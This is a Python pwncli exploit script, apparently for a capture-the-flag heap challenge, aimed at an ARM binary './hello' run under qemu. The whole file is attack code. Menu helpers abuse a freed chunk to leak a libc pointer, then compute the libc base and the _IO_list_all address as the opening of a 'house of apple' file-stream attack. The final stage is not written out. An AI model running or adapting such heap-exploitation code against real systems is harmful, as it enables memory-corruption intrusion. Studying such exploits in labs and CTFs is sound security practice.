from pwncli import * # type:ignore
import argparse

context.arch = 'arm'
context.binary = './hello'
context.log_level = 'debug'

debug = False

args = argparse.ArgumentParser(description='Exploit Script')
args.add_argument('--debug', action='store_true', help='Run in debug mode')

if args.parse_args().debug:
    debug = True

if debug:
    gift.io = process(['qemu-arm', '-g', '1234', '-L', '../lib', './hello'])
else:
    gift.io = process(['qemu-arm', '-L', '../lib', './hello'])

gift.elf = ELF('./hello')
gift.libc = ELF('../lib/lib/libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i):
    sla(b"Enter your choice:", i)

def add(idx, size):
    cmd('1')
    ru("Enter index and size:\n")
    sl(f"{idx} {size}")
    ru("Memory allocated.\n")

def dele(idx):
    cmd('2')
    ru("Enter index to free:\n")
    sl(f"{idx}")
    ru("Memory freed.\n")

def edit(idx, size, buf):
    cmd('3')
    ru("Enter index and size to edit:\n")
    sl(f"{idx} {size}")
    sl(buf)
    ru("Memory edited.\n")

def show(idx, size) -> bytes:
    cmd('4')
    ru("Enter index and size to show:\n")
    sl(f"{idx} {size}")
    data = r(size)
    ru("Memory shown.\n")
    return data

def house_of_apple():
    def leak_lib() -> int:
        add(0, 0x300)
        add(1, 0xc)
        dele(0)
        main_arena = u32(show(0, 0x4)) - 0x34
        libc_base = main_arena - 0x13d7d4
        return libc_base

    libc.address = leak_lib()
    io_list_all = libc.symbols['_IO_list_all']
    success(f"libc.address = {hex(libc.address)}")
    success(f"io_list_all = {hex(io_list_all)}")

if __name__ == '__main__':
    house_of_apple()
    ia()